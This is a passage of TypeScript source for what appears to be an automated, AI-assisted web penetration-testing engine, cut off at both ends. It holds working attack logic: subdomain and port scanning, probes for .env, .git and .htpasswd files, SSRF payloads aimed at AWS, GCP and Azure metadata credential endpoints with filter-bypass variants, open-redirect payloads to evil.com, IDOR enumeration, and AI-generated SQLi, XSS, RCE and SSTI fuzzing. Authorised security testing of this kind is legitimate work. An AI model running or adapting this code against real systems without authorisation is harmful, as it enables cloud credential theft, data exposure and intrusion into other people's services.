      // (StackGapAnalyzer, ToolManager, etc.) that share this axios instance.
      void jobContext.run({ sessionId, authFlowId, jobId }, async () => {
      try {
        const allFindings: any[] = [];
        const urlObj = new URL(targetUrl);
        const hostname = urlObj.hostname;
        
        let discoveredAssets: string[] = [targetUrl];
        let openPorts: any[] = [];
        let techStacks: any[] = [];
        let endpoints: {url: string, method: string}[] = [];

        // --- PHASE 1: RECONNAISSANCE (MANDATORY SUCCESS) ---
        this.updateJob(jobId, 'running', 'Phase 1: Reconnaissance');
        this.log(jobId, 'info', 'Starting Phase 1: Reconnaissance & Asset Discovery');

        // Strategy 1: Passive Discovery & Common Subdomain Brute-forcing
        this.log(jobId, 'info', 'Strategy 1: Passive Subdomain Discovery & Common Subdomain Brute-forcing');
        try {
          const subResult = await ToolManager.execute('subfinder', ['-d', hostname, '-silent'], jobId,
            () => ToolManager.polyfillSubdomainDiscovery(hostname));
          if (subResult?.stdout) {
            const subs = subResult.stdout.trim().split('\n').filter((s: string) => s.length > 0).map((s: string) => `https://${s}`);
            discoveredAssets.push(...subs);
          }

          // Brute-force common subdomains (SecLists-backed, parallel batches)
          const domainParts = hostname.split('.');
          const baseDomain = domainParts.length > 2 ? domainParts.slice(-2).join('.') : hostname;
          const subPrefixes = getSubdomains(200);
          const subBatchSize = 30;
          for (let i = 0; i < subPrefixes.length; i += subBatchSize) {
            const batch = subPrefixes.slice(i, i + subBatchSize);
            const results = await Promise.all(batch.map(async (sub) => {
              const subUrl = `https://${sub}.${baseDomain}`;
              try {
                const res = await axios.get(subUrl, { timeout: 2000, validateStatus: () => true });
                return res.status !== 404 ? subUrl : null;
              } catch { return null; }
            }));
            for (const r of results) if (r) discoveredAssets.push(r);
          }
        } catch (e) {}

        // Strategy 2: Active Port Scanning
        this.log(jobId, 'info', 'Strategy 2: Active Port Scanning');
        try {
          const nmapResult = await ToolManager.execute('nmap', ['-F', hostname], jobId,
            () => ToolManager.polyfillPortScan(hostname, [80, 443, 8080, 8443, 3000, 22, 3306, 5432, 6379]));
          if (nmapResult?.stdout) {
            openPorts.push({ host: hostname, results: nmapResult.stdout });
          }
        } catch (e) {}

        discoveredAssets = [...new Set(discoveredAssets)];
        if (discoveredAssets.length === 0 && openPorts.length === 0) {
          throw new Error('Phase 1 failed to yield results.');
        }
        
        allFindings.push({ phase: 'Phase 1', type: 'Assets Discovered', data: discoveredAssets });
        allFindings.push({ phase: 'Phase 1', type: 'Port Scan Results', data: openPorts });

        // --- PHASE 2: FINGERPRINTING (DEEP ANALYSIS) ---
        this.updateJob(jobId, 'running', 'Phase 2: Fingerprinting');
        this.log(jobId, 'info', `Starting Phase 2: Fingerprinting discovered assets`);

        for (const asset of discoveredAssets.slice(0, 5)) {
          try {
            const httpxResult = await ToolManager.execute(
              'httpx',
              [
                '-u', asset,
                '-silent', '-json', '-no-color',
                '-timeout', '8', '-retries', '1',
                '-tech-detect', '-status-code', '-title',
                ...defaultHttpIdentityHeaderArgs(),
              ],
              jobId,
              () => ToolManager.polyfillHttpx(asset)
            );
            if (httpxResult?.stdout) {
              const data = JSON.parse(httpxResult.stdout);
              techStacks.push({ asset, results: data });
              MemoryManager.updateTech(jobId, hostname, data.tech);
              this.log(jobId, 'info', `Fingerprint for ${asset}: [${data.status_code}] ${data.title}`);
            }
          } catch (e) {}
        }
        allFindings.push({ phase: 'Phase 2', type: 'Fingerprinting Results', data: techStacks });

        // --- PHASE 3: DISCOVERY (ACTIVE ENUMERATION) ---
        this.updateJob(jobId, 'running', 'Phase 3: Discovery');
        this.log(jobId, 'info', 'Starting Phase 3: Active Enumeration & Content Discovery');

        const browser = await puppeteer.launch({ 
          headless: true, 
          executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || '/usr/bin/google-chrome',
          args: [
            '--no-sandbox', 
            '--disable-setuid-sandbox',
            '--disable-blink-features=AutomationControlled'
          ] 
        }).catch(async () => {
          // Fallback to default if /usr/bin/google-chrome doesn't exist
          return await puppeteer.launch({
            headless: true,
            args: ['--no-sandbox', '--disable-setuid-sandbox']
          });
        });
        
        try {
          for (const asset of discoveredAssets.slice(0, 10)) { // Increased depth
            this.log(jobId, 'info', `Crawling ${asset}...`);
            const page = await browser.newPage();
            await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36');
            
            try {
              const response = await page.goto(asset, { waitUntil: 'networkidle2', timeout: 30000 });
              if (!response) continue;

              // 1. DOM Link Extraction
              const domEndpoints = await page.evaluate(() => {
                try {
                  const links = Array.from(document.querySelectorAll('a')).map(a => ({ url: a.href, method: 'GET' }));
                  const forms = Array.from(document.querySelectorAll('form')).map(f => ({
                    url: new URL(f.action || window.location.href, window.location.origin).href,
                    method: (f.method || 'GET').toUpperCase()
                  }));
                  const scripts = Array.from(document.querySelectorAll('script')).map(s => s.src).filter(src => src);
                  return { links, forms, scripts };
                } catch (e) {
                  return { links: [], forms: [], scripts: [] };
                }
              }).catch(() => ({ links: [], forms: [], scripts: [] }));
              
              endpoints.push(...domEndpoints.links, ...domEndpoints.forms);

              // 2. JS Secret Mining & Endpoint Extraction
              for (const scriptUrl of domEndpoints.scripts) {
                try {
                  const jsRes = await axios.get(scriptUrl, { timeout: 5000, validateStatus: () => true });
                  if (jsRes.status === 200 && typeof jsRes.data === 'string') {
                    const jsContent = jsRes.data;
                    
                    // Extract hidden endpoints from JS
                    const hiddenPaths = jsContent.match(/(?:"|')(\/[a-zA-Z0-9\/\._\-\?\&]+)(?:"|')/g) || [];
                    hiddenPaths.forEach(p => {
                      const path = p.replace(/["']/g, '');
                      if (path.length > 2) endpoints.push({ url: new URL(path, asset).href, method: 'GET' });
                    });

                    // Search for secrets in JS
                    if (ai) {
                      const secretPrompt = `Analyze this JavaScript file content for hardcoded secrets, API keys, or sensitive internal endpoints.
                      URL: ${scriptUrl}
                      Content Snippet: ${jsContent.substring(0, 5000)}
                      
                      Return JSON: { "found": boolean, "secrets": string[], "explanation": string }`;
                      
                      const secretText = await ai.generate(secretPrompt, true);
                      
                      if (secretText) {
                        const analysis = JSON.parse(secretText);
                        if (analysis.found) {
                          this.log(jobId, 'vuln', `SECRET DISCOVERED IN JS: ${scriptUrl}`, { secrets: analysis.secrets, explanation: analysis.explanation });
                          MemoryManager.addFinding(jobId, hostname, { type: 'Hardcoded Secret', asset: scriptUrl, gap: 'Sensitive data in client-side JS', details: analysis.explanation });
                        }
                      }
                    }
                  }
                } catch (e) {}
              }
              
              // 3. Regex-based Link Extraction (for JS/Source)
              const bodyContent = await page.content().catch(() => '');
              const regexLinks = bodyContent.match(/(?:"|')(\/[a-zA-Z0-9\/\._\-\?\&]+)(?:"|')/g) || [];
              const parsedRegexLinks = regexLinks.map(l => {
                const path = l.replace(/["']/g, '');
                try {
                  return { url: new URL(path, asset).href, method: 'GET' };
                } catch(e) { return null; }
              }).filter(l => l !== null) as {url: string, method: string}[];

              endpoints.push(...parsedRegexLinks);
              
              // 3. Robots.txt Parsing
              try {
                const robotsRes = await axios.get(`${new URL(asset).origin}/robots.txt`, { timeout: 5000, validateStatus: () => true });
                if (robotsRes.status === 200 && typeof robotsRes.data === 'string') {
                  const disallowed = robotsRes.data.match(/Disallow: (.*)/g) || [];
                  disallowed.forEach(line => {
                    const path = line.split(': ')[1]?.trim();
                    if (path) {
                      try {
                        endpoints.push({ url: new URL(path, asset).href, method: 'GET' });
                      } catch (e) {}
                    }
                  });
                }
              } catch (e) {}

            } catch (e: any) {
              if (e.message.includes('Execution context was destroyed')) {
                this.log(jobId, 'warn', `Crawling ${asset} interrupted by navigation. Skipping...`);
              } else {
                this.log(jobId, 'warn', `Failed to crawl ${asset}: ${e instanceof Error ? e.message : String(e)}`);
              }
            } finally {
              if (!page.isClosed()) {
                await page.close().catch(() => {});
              }
            }
          }
        } finally {
          await browser.close();
        }

        // Directory Brute-forcing across ALL assets (SecLists-backed, parallel batches)
        this.log(jobId, 'info', 'Strategy 2: Multi-Asset Content Discovery (SecLists common.txt)');

        for (const asset of discoveredAssets.slice(0, 5)) {
          try {
            const origin = new URL(asset).origin;
            const assetHostname = new URL(asset).hostname;
            await this.checkWildcard200(origin);

            const pathResult = await ToolManager.polyfillPathEnumeration(origin, 250);
            if (pathResult?.stdout) {
              for (const line of pathResult.stdout.split('\n').filter(Boolean)) {
                try {
                  const entry = JSON.parse(line) as { url: string; status: number; bodyLen: number };
                  // polyfillPathEnumeration already filters wildcard-200 responses
                  // via a 2000-char canary comparison, so surviving 200s are genuine.
                  if (entry.status === 200) {
                    this.log(jobId, 'info', `Discovered hidden endpoint: ${entry.url} [${entry.status}]`);
                    endpoints.push({ url: entry.url, method: 'GET' });
                  } else if (entry.status !== 404) {
                    this.log(jobId, 'info', `Potential interesting endpoint: ${entry.url} [${entry.status}]`);
                    endpoints.push({ url: entry.url, method: 'GET' });
                  }
                } catch {}
              }
            }
          } catch (e) {}
        }

        endpoints = Array.from(new Set(endpoints.map(e => JSON.stringify(e)))).map(s => JSON.parse(s));
        allFindings.push({ phase: 'Phase 3', type: 'Endpoints Discovered', count: endpoints.length });

        // AI-Driven Security Interest Ranking
        let rankedEndpoints: any[] = [];
        if (ai && endpoints.length > 0) {
          this.log(jobId, 'info', 'Phase 3.5: AI-Driven Security Interest Ranking');
          const rankingPrompt = `Rank the following endpoints by security interest (likelihood of vulnerability).
          Endpoints: ${JSON.stringify(endpoints.slice(0, 100))}
          Tech Stack: ${MemoryManager.getMemory(jobId, hostname).tech.join(', ')}

          Return JSON: { "ranked_endpoints": [ { "url": string, "method": string, "reason": string, "priority": number } ] }`;

          try {
            const rankingText = await ai.generate(rankingPrompt, true);
            if (rankingText) {
              const ranked = JSON.parse(rankingText).ranked_endpoints;
              rankedEndpoints = ranked;
              this.log(jobId, 'info', `AI ranked ${ranked.length} endpoints for prioritized testing.`);
              allFindings.push({ phase: 'Phase 3.5', type: 'AI Prioritization', data: ranked });
            }
          } catch (e) {}
        }

        // --- PHASE 4: EXPLOITATION & PoC (VULNERABILITY VERIFICATION) ---
        this.updateJob(jobId, 'running', 'Phase 4: Exploitation');
        this.log(jobId, 'info', 'Starting Phase 4: Autonomous AI-Driven Vulnerability Verification (Prioritized & Chained)');

        const memory = MemoryManager.getMemory(jobId, hostname);
        const discoveredInfo = {
          users: memory.discoveredUsers,
          identifiers: memory.identifiers,
          findings: memory.findings.map(f => f.type)
        };

        // --- 4a: Specialized Auditors (Auth, CORS, JWT, Session, Business Logic) ---
        this.log(jobId, 'info', 'Phase 4a: Running specialized auditors');
        for (const stack of techStacks) {
          const tech = stack.results?.tech || [];
          await this.auditAuthenticationFlow(jobId, stack.asset, tech, ai);
          await this.auditBusinessLogic(jobId, stack.asset, tech, ai);
        }
        // Run auth/session audits on the primary target even without tech signatures
        if (techStacks.length === 0) {
          await this.auditAuthenticationFlow(jobId, targetUrl, ['auth', 'session'], ai);
        }

        // --- 4b: Sensitive File & Data Disclosure Auditor ---
        this.log(jobId, 'info', 'Phase 4b: Sensitive File & Data Disclosure Audit');

        // Expanded sensitive file detection patterns
        const sensitivePathPatterns = [
          /\.(env|env\.local|env\.production|env\.staging|env\.dev)$/i,
          /\.(git|gitignore|gitconfig|git\/config|git\/HEAD)$/i,
          /\.(config|cfg|ini|yml|yaml|toml|xml|properties)$/i,
          /\.(bak|backup|old|orig|swp|sav|tmp|temp)$/i,
          /\.(sql|dump|db|sqlite|sqlite3|mdb)$/i,
          /\.(log|error_log|access_log|debug\.log)$/i,
          /\.(pem|key|crt|cert|p12|pfx|jks)$/i,
          /\.(htpasswd|htaccess|passwd|shadow)$/i,
        ];
        const sensitiveKeywords = [
          'phpinfo', '.env', 'metrics', 'debug', 'actuator', 'health',
          'swagger', 'api-docs', 'openapi', '.well-known', 'server-status',
          'server-info', 'wp-config', 'config.php', 'database.yml',
          'credentials', 'secret', 'backup', '.DS_Store', 'Thumbs.db',
          'crossdomain.xml', 'clientaccesspolicy.xml', 'elmah.axd',
          'trace.axd', 'web.config', 'application.properties',
        ];

        const sensitiveFiles = endpoints.filter(e => 
          sensitivePathPatterns.some(p => p.test(e.url)) ||
          sensitiveKeywords.some(kw => e.url.toLowerCase().includes(kw))
        );

        // Also probe known sensitive paths directly on discovered assets
        const directProbes = [
          '/.env', '/.git/config', '/.git/HEAD', '/phpinfo.php',
          '/server-status', '/server-info', '/.htpasswd', '/wp-config.php',
          '/actuator/env', '/actuator/health', '/actuator/beans',
          '/swagger-ui.html', '/swagger.json', '/api-docs',
          '/debug', '/metrics', '/trace', '/.DS_Store',
          '/backup.sql', '/database.sql', '/dump.sql',
          '/crossdomain.xml', '/robots.txt', '/sitemap.xml',
          '/api/v1/debug', '/api/config', '/admin/config',
          '/info', '/health', '/status', '/.well-known/openid-configuration',
        ];

        // Build full list of sensitive endpoints to check
        const probeUrls = new Set(sensitiveFiles.map(sf => sf.url));
        for (const asset of discoveredAssets.slice(0, 5)) {
          for (const probe of directProbes) {
            try { probeUrls.add(new URL(probe, asset).href); } catch {}
          }
        }

        const sensitiveContentMarkers = [
          'DB_', 'AWS_', 'SECRET', 'PASSWORD', 'PRIVATE_KEY', 'API_KEY', 'ACCESS_KEY',
          'PHP Version', 'System Info', 'metrics_', 'debug_mode',
          'mysql_connect', 'pg_connect', 'redis://', 'mongodb://',
          'BEGIN RSA', 'BEGIN PRIVATE', 'BEGIN CERTIFICATE',
          'jdbc:', 'amqp://', 'smtp://',
          'DJANGO_SECRET', 'FLASK_SECRET', 'JWT_SECRET', 'SESSION_SECRET',
          'STRIPE_SECRET', 'TWILIO_AUTH', 'SENDGRID_API',
          'Authorization:', 'Bearer ', 'Basic ',
        ];

        let sensitiveFileCount = 0;
        for (const sfUrl of probeUrls) {
          if (sensitiveFileCount >= 20) break; // Cap to avoid excessive requests
          try {
            const sfHostname = new URL(sfUrl).hostname;
            const res = await axios.get(sfUrl, { timeout: 5000, validateStatus: () => true });
            if (res.status === 404 || res.status === 403) continue;
            const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
            
            if (this.isWildcardResponse(sfHostname, bodyStr)) continue;

            const matchedMarkers = sensitiveContentMarkers.filter(m => bodyStr.includes(m));
            const hasSensitiveContent = matchedMarkers.length > 0;

            // Git config — verify body shape: real .git/config is plain
            // text < 5 KB starting with `[core]`. SPAs returning HTML shells
            // never match this combination.
            if (sfUrl.includes('.git/config') && res.status === 200 && bodyStr.length < 5120 && /^\s*\[core\]/.test(bodyStr)) {
              this.log(jobId, 'vuln', `CONFIRMED Git Repository Exposure: ${sfUrl}`);
              MemoryManager.addFinding(jobId, hostname, { type: 'Git Exposure', endpoint: sfUrl, gap: 'Git repository accessible — source code leak', chain_potential: 'Extract credentials, API keys, and source code' });
              sensitiveFileCount++;
              continue;
            }

            // Actuator endpoints — verify body shape, not URL substring.
            // SPAs return 200 + HTML for any path including /actuator; we
            // only want the actual Spring Boot Actuator JSON response.
            const ct = String(res.headers['content-type'] ?? '').toLowerCase();
            if (sfUrl.includes('actuator') && res.status === 200 && ct.includes('application/json') && /"(status|_links|components|diskSpace|env|beans|configprops)"\s*:/i.test(bodyStr)) {
              this.log(jobId, 'vuln', `CONFIRMED Spring Actuator Exposure: ${sfUrl}`, { preview: bodyStr.substring(0, 300) });
              MemoryManager.addFinding(jobId, hostname, { type: 'Actuator Exposure', endpoint: sfUrl, gap: 'Spring Boot Actuator endpoint exposed', chain_potential: 'Environment variables, beans, and health data leaked' });
              sensitiveFileCount++;
              continue;
            }

            // Swagger/OpenAPI — verify body shape:
            //   - JSON: must contain `"swagger":` or `"openapi":` keys
            //   - HTML: must be the Swagger UI (`<title>Swagger UI</title>`)
            // Plain occurrence of the word "swagger" in HTML doesn't qualify.
            const isSwaggerJson = ct.includes('application/json') && /"(swagger|openapi)"\s*:\s*"\d/.test(bodyStr);
            const isSwaggerUi = ct.includes('text/html') && /<title>\s*Swagger UI\s*<\/title>/i.test(bodyStr);
            if ((sfUrl.includes('swagger') || sfUrl.includes('api-docs') || sfUrl.includes('openapi')) && res.status === 200 && (isSwaggerJson || isSwaggerUi)) {
              this.log(jobId, 'vuln', `API Documentation Exposed: ${sfUrl}`, { preview: bodyStr.substring(0, 300) });
              MemoryManager.addFinding(jobId, hostname, { type: 'API Docs Exposure', endpoint: sfUrl, gap: 'Swagger/OpenAPI docs publicly accessible', chain_potential: 'Map all API endpoints for targeted exploitation' });
              sensitiveFileCount++;
              continue;
            }

            if (res.status === 200 && hasSensitiveContent && ai) {
              const analysisPrompt = `As an autonomous security agent (argila), verify if this is a SENSITIVE FILE DISCLOSURE.
              URL: ${sfUrl}
              Status: ${res.status}
              Matched sensitive markers: ${matchedMarkers.join(', ')}
              Body Snippet: ${bodyStr.substring(0, 3000)}
              
              Determine if this file contains REAL sensitive information (credentials, internal paths, system config) or if it's a false positive.
              Classify severity: CRITICAL (credentials, keys), HIGH (internal config, debug), MEDIUM (info leak), LOW (minor disclosure).
              Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

              const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
              if (analysis.isVulnerable && analysis.confidence > 0.7) {
                this.log(jobId, 'vuln', `CONFIRMED Sensitive File Disclosure: ${analysis.gap_identified}`, { explanation: analysis.explanation, chain: analysis.chain_potential, url: sfUrl });
                MemoryManager.addFinding(jobId, hostname, { type: 'Sensitive File Disclosure', endpoint: sfUrl, gap: analysis.gap_identified, chain_potential: analysis.chain_potential });
                sensitiveFileCount++;
              }
            }
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4b complete: ${sensitiveFileCount} sensitive file(s) confirmed across ${probeUrls.size} probes`);

        // --- 4c: SSRF & Open Redirect Auditor ---
        this.log(jobId, 'info', 'Phase 4c: SSRF & Open Redirect Audit');

        // Expanded SSRF endpoint detection — GET and POST parameters
        const ssrfParamPatterns = ['url', 'dest', 'redirect', 'uri', 'path', 'next', 'target', 'rurl', 'return', 'returnTo', 'callback', 'go', 'link', 'src', 'source', 'file', 'document', 'fetch', 'proxy', 'host', 'domain', 'site', 'page', 'feed', 'img', 'image'];
        const ssrfEndpoints = endpoints.filter(e => {
          const lower = e.url.toLowerCase();
          return ssrfParamPatterns.some(p => lower.includes(`${p}=`) || lower.includes(`${p}%3d`));
        });

        // Cloud metadata payloads — expanded with bypass variants
        const cloudPayloads = [
          // AWS
          { url: 'http://169.254.169.254/latest/meta-data/', name: 'AWS IMDSv1', markers: ['ami-id', 'instance-id', 'iam', 'security-credentials'] },
          { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', name: 'AWS IAM Creds', markers: ['AccessKeyId', 'SecretAccessKey', 'Token'] },
          { url: 'http://169.254.169.254/latest/user-data', name: 'AWS User Data', markers: ['#!/', 'cloud-init', 'user-data'] },
          // AWS bypass variants
          { url: 'http://[::ffff:169.254.169.254]/latest/meta-data/', name: 'AWS IPv6 Bypass', markers: ['ami-id', 'instance-id'] },
          { url: 'http://169.254.169.254.nip.io/latest/meta-data/', name: 'AWS DNS Rebind', markers: ['ami-id', 'instance-id'] },
          { url: 'http://0xA9FEA9FE/latest/meta-data/', name: 'AWS Hex IP', markers: ['ami-id', 'instance-id'] },
          // GCP
          { url: 'http://metadata.google.internal/computeMetadata/v1/', name: 'GCP Metadata', markers: ['computeMetadata', 'project-id'] },
          { url: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', name: 'GCP Token', markers: ['access_token'] },
          // Azure
          { url: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', name: 'Azure Metadata', markers: ['compute', 'vmId'] },
          { url: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', name: 'Azure Token', markers: ['access_token'] },
          // DigitalOcean
          { url: 'http://169.254.169.254/metadata/v1/', name: 'DO Metadata', markers: ['droplet_id', 'hostname'] },
          // Internal services
          { url: 'http://127.0.0.1:6379/', name: 'Redis', markers: ['REDIS', 'redis_version'] },
          { url: 'http://127.0.0.1:9200/', name: 'Elasticsearch', markers: ['cluster_name', 'version'] },
          { url: 'http://127.0.0.1:8500/v1/agent/self', name: 'Consul', markers: ['Config', 'Member'] },
        ];

        let ssrfCount = 0;
        for (const se of ssrfEndpoints.slice(0, 30)) {
          if (ssrfCount >= 5) break; // Cap confirmed SSRFs
          for (const cp of cloudPayloads) {
            try {
              // Try replacing each matching parameter
              const paramRegex = new RegExp(`(${ssrfParamPatterns.join('|')})=([^&]+)`, 'i');
              const testUrl = se.url.replace(paramRegex, `$1=${encodeURIComponent(cp.url)}`);
              if (testUrl === se.url) continue; // No param was replaced
              
              const headers: Record<string, string> = { 'User-Agent': 'Mozilla/5.0' };
              if (cp.name.includes('GCP')) headers['Metadata-Flavor'] = 'Google';
              if (cp.name.includes('Azure')) headers['Metadata'] = 'true';
              
              const res = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true, headers, maxRedirects: 0 });
              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

              if (res.status === 200 && cp.markers.some(m => bodyStr.includes(m))) {
                this.log(jobId, 'vuln', `CONFIRMED SSRF → ${cp.name}: ${se.url}`, { payload: cp.url, evidence: bodyStr.substring(0, 500) });
                MemoryManager.addFinding(jobId, hostname, { type: 'SSRF', endpoint: se.url, gap: `SSRF to ${cp.name}`, chain_potential: `Full ${cp.name.split(' ')[0]} takeover via metadata tokens` });
                ssrfCount++;
                break; // Move to next endpoint once one payload hits
              }
            } catch {}
          }
        }

        // Open Redirect detection via parameter manipulation
        const redirectEndpoints = endpoints.filter(e => {
          const lower = e.url.toLowerCase();
          return ['redirect', 'next', 'return', 'returnto', 'callback', 'go', 'url', 'rurl', 'dest'].some(p => lower.includes(`${p}=`));
        });

        for (const re of redirectEndpoints.slice(0, 20)) {
          try {
            const redirectPayloads = [
              'https://evil.com',
              '//evil.com',
              '/\\evil.com',
              'https:evil.com',
              '////evil.com',
            ];
            for (const payload of redirectPayloads) {
              const paramRegex = new RegExp(`(redirect|next|return|returnto|callback|go|url|rurl|dest)=([^&]+)`, 'i');
              const testUrl = re.url.replace(paramRegex, `$1=${encodeURIComponent(payload)}`);
              if (testUrl === re.url) continue;
              
              const res = await axios.get(testUrl, { timeout: 5000, maxRedirects: 0, validateStatus: () => true });
              const location = (res.headers['location'] || '').toLowerCase();
              if ((res.status === 301 || res.status === 302 || res.status === 303 || res.status === 307 || res.status === 308) && location.includes('evil.com')) {
                this.log(jobId, 'vuln', `CONFIRMED OPEN REDIRECT: ${re.url}`, { payload, location: res.headers['location'] });
                MemoryManager.addFinding(jobId, hostname, { type: 'Open Redirect', endpoint: re.url, gap: 'Unvalidated redirect allows arbitrary domain', chain_potential: 'Phishing, OAuth token theft via redirect' });
                break;
              }
            }
          } catch {}
        }
        this.log(jobId, 'info', `Phase 4c complete: ${ssrfCount} SSRF(s) confirmed across ${ssrfEndpoints.length} candidate endpoints`);

        // 4. Generic Vulnerability Fuzzing (SQLi, XSS, etc.)
        const vulnerabilities: any[] = [];
        
        // --- STACK GAP ANALYSIS (Adversary Simulation) ---
        this.log(jobId, 'info', 'Phase 4: Stack Gap Analysis (WAF/Proxy Smuggling)');
        for (const asset of discoveredAssets.slice(0, 5)) {
          try {
            const gaps = await StackGapAnalyzer.analyze(asset);
            if (gaps.length > 0) {
              this.log(jobId, 'vuln', `STACK GAP IDENTIFIED on ${asset}`, { gaps });
              allFindings.push({ phase: 'Phase 4', type: 'Stack Gap Findings', asset, data: gaps });
            }
          } catch (e) {
            this.log(jobId, 'warn', `Stack gap analysis failed for ${asset}: ${(e as Error).message}`);
          }
        }

        // Priority-based testing: combine AI-ranked with keyword-based high-value endpoints
        const keywordEndpoints = endpoints.filter(e => {
          const lower = e.url.toLowerCase();
          return lower.includes('api') || lower.includes('admin') || lower.includes('auth') || lower.includes('?') || lower.includes('login') || lower.includes('user') || lower.includes('account') || lower.includes('profile');
        });

        // Build priority map to preserve highest priority per URL
        const priorityMap = new Map<string, { url: string; method: string; priority: number }>();
        for (const re of rankedEndpoints) {
          const entry = { url: re.url, method: re.method || 'GET', priority: re.priority || 1 };
          const existing = priorityMap.get(re.url);
          if (!existing || entry.priority < existing.priority) priorityMap.set(re.url, entry);
        }
        for (const ke of keywordEndpoints) {
          if (!priorityMap.has(ke.url)) priorityMap.set(ke.url, { ...ke, priority: 2 });
        }

        const prioritizedEndpoints = Array.from(priorityMap.values())
          .sort((a, b) => a.priority - b.priority)
          .slice(0, 100);

        this.log(jobId, 'info', `Executing autonomous exploit chain on ${prioritizedEndpoints.length} prioritized endpoints`, {
          active_intelligence: {
            users: discoveredInfo.users.length,
            identifiers: Object.keys(discoveredInfo.identifiers).length,
            prioritized_targets: prioritizedEndpoints.length
          }
        });

        // --- IDOR Detection (enhanced with UUID and string ID patterns) ---
        for (const ep of prioritizedEndpoints) {
          // Numeric ID pattern
          const numIdMatch = ep.url.match(/\/(\d+)(?:\/|$|\?)/);
          // UUID pattern
          const uuidMatch = ep.url.match(/\/([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})(?:\/|$|\?)/i);

          if (numIdMatch || uuidMatch) {
            const originalId = numIdMatch ? numIdMatch[1] : uuidMatch![1];
            const testIds = numIdMatch
              ? [String(parseInt(originalId) + 1), String(parseInt(originalId) - 1), '1', '0', '999999']
              : ['00000000-0000-0000-0000-000000000000', '11111111-1111-1111-1111-111111111111'];

            // Fetch baseline once
            const baselineRes = await axios.get(ep.url, { timeout: 5000, validateStatus: () => true }).catch(() => null);
            if (!baselineRes || baselineRes.status === 404) continue;

            for (const testId of testIds) {
              try {
                const testUrl = ep.url.replace(`/${originalId}`, `/${testId}`);
                const res = await axios.get(testUrl, { timeout: 5000, validateStatus: () => true });
                
                const baseBody = typeof baselineRes.data === 'string' ? baselineRes.data : JSON.stringify(baselineRes.data);
                const testBody = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);

                if (res.status === 200 && res.status === baselineRes.status && testBody !== baseBody && testBody.length > 50) {
                  if (ai) {
                    const analysisPrompt = `Analyze these two responses for IDOR (Insecure Direct Object Reference).
                    Original URL: ${ep.url} | Test URL: ${testUrl}
                    Response 1 Body: ${baseBody.substring(0, 1000)}
                    Response 2 Body: ${testBody.substring(0, 1000)}
                    
                    Determine if changing the ID allowed access to another user's/object's data. Check for PII, different user context, or unauthorized data access.
                    Return JSON: { "isVulnerable": boolean, "confidence": number, "explanation": string, "gap_identified": string, "chain_potential": string | null }`;

                    const analysis = safeJsonParse<AiVulnResult>(await ai.generate(analysisPrompt, true), NULL_VULN);
                    if (analysis.isVulnerable && analysis.confidence > 0.8) {
                      this.log(jobId, 'vuln', `CONFIRMED IDOR: ${analysis.gap_identified}`, { explanation: analysis.explanation, originalUrl: ep.url, testUrl });
                      vulnerabilities.push({ endpoint: ep.url, type: 'IDOR', gap: analysis.gap_identified, evidence: analysis.explanation });
                      MemoryManager.addFinding(jobId, hostname, { type: 'IDOR', endpoint: ep.url, gap: analysis.gap_identified, chain_potential: analysis.chain_potential });
                      break; // One confirmed IDOR per endpoint is enough
                    }
                  }
                }
              } catch {}
            }
          }
        }

        // --- Payload Fuzzing (SQLi, XSS, Path Traversal, SSRF, RCE, SSTI, NoSQLi) ---
        const vulnTypes = ['SQLi', 'XSS', 'Path Traversal', 'SSRF', 'RCE', 'SSTI', 'NoSQLi'];

        // Cache baselines per URL to avoid redundant requests
        const baselineCache = new Map<string, { status: number; body: string } | null>();
        async function getBaseline(url: string) {
          if (baselineCache.has(url)) return baselineCache.get(url)!;
          try {
            const res = await axios.get(url, { timeout: 5000, validateStatus: () => true });
            const body = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
            const entry = { status: res.status, body };
            baselineCache.set(url, entry);
            return entry;
          } catch {
            baselineCache.set(url, null);
            return null;
          }
        }

        for (const ep of prioritizedEndpoints) {
          const baseline = await getBaseline(ep.url);
          
          for (const type of vulnTypes) {
            try {
              const aiContext = `Endpoint: ${ep.url}, Method: ${ep.method}, Tech: ${memory.tech.join(', ')}, Discovered Intel: ${JSON.stringify(discoveredInfo)}`;
              const customPayload = await PayloadOven.generateCustomPayload(ai, type, aiContext);
              
              // Smart parameter replacement — replace each param value individually
              let testUrl = ep.url;
              if (ep.url.includes('=')) {
                testUrl = ep.url.replace(/=([^&]+)/g, `=${encodeURIComponent(customPayload)}`);
              } else {
                testUrl = ep.url.includes('?') ? `${ep.url}&test=${encodeURIComponent(customPayload)}` : `${ep.url}?test=${encodeURIComponent(customPayload)}`;
              }
              
              const startTime = Date.now();
              const res = await axios.get(testUrl, { timeout: 8000, validateStatus: () => true });
              const latency = Date.now() - startTime;
              
              const bodyStr = typeof res.data === 'string' ? res.data : JSON.stringify(res.data);
              const isStatusDiff = baseline && res.status !== baseline.status;
              const isLatencySpike = type === 'SQLi' && latency > 3000;
              
              // Type-specific markers must be probe-induced evidence,
              // not generic words that occur naturally in benign content.
              // Old markers triggered FPs on user lists ('root:'),
              // metadata field names ('uid='), the literal number 49
              // appearing anywhere in JSON, or NoSQL operators echoed
              // back from the URL ('$gt' / '$ne').
              const errorMarkers: Record<string, (string | RegExp)[]> = {
                'SQLi': ['sql syntax', 'mysql_fetch', 'postgresql', 'sqlite_', 'ora-00', 'ora-01', 'mssql', 'unclosed quotation', 'quoted string not properly terminated', 'syntax error at or near', 'sqlstate['],
                'XSS': [customPayload, '<script>', 'onerror=', 'onload='],
                'Path Traversal': ['root:x:0:0:', 'daemon:x:', '[fonts]', '[extensions]', '/bin/bash', '/bin/sh', '/sbin/nologin', '[boot loader]'],
